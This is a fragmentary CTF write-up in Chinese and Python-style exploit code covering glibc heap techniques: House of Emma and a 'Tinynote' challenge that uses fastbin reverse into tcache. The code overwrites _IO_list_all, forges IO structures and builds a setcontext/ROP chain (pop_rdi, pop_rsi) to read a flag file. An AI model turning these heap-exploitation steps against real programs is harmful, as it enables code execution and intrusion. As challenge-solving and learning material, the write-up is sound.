...
### House OF Emma(largebinattack/houseofkiwi)
...
### Tinynote(fastbin reverse into tcache/2.33uaf)
...
利用思路fastbin reverse into tcache任意地址写劫持IO结构体(这种方式高版本只能用来劫持chain字段)，然后伪造IO触发即可
...
change(heap_base+0x600,p64(magic)+p64(heap_base+0x700))
change(heap_base+0x720,p64(setcontext+61))
change(heap_base+0x7a0,p64(heap_base+0x800)+p64(pop_rdi))
change(heap_base+0x7c0,'flag'.ljust(0x10,'\x00'))
change(heap_base+0x800,p64(heap_base+0x7c0)+p64(pop_rsi))
...
p_list_all = libc_base + libc.sym['_IO_list_all']
change(1)
free(19)
change(2)
edit(8,p64(0)+p64(p_list_all-0x20)+'\n')
change(3)
add(0xa0,'a'*0x30)#C2
change(2)
edit(8,p64(heap_base+0x3c00)*2+'\n')
